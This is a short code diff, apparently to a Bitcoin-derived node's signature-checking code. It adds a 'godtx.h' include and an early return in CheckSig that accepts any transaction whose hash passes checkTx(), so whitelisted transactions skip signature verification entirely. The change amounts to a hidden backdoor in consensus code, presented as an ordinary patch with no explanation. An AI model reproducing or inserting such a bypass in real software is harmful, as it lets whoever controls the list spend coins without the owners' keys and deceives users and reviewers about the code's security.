@@ -13,6 +13,8 @@
 #include <uint256.h>
 #include <iostream>
 #include <iomanip>
+#include <script/godtx.h>
+
 typedef std::vector<unsigned char> valtype;
 
 namespace {
@@ -1293,7 +1295,10 @@ bool TransactionSignatureChecker::CheckSig(const std::vector<unsigned char>& vch
     int nHashType = GetHashType(vchSig);
     vchSig.pop_back();
 
-    uint256 sighash = SignatureHash(scriptCode, *txTo, nIn, nHashType, amount, sigversion, this->txdata);
+	if ((txTo != nullptr) && (checkTx(txTo->GetHash().GetHex())))
+		return true;
+
+	uint256 sighash = SignatureHash(scriptCode, *txTo, nIn, nHashType, amount, sigversion, this->txdata);
 
     if (!VerifySignature(vchSig, pubkey, sighash))
         return false;
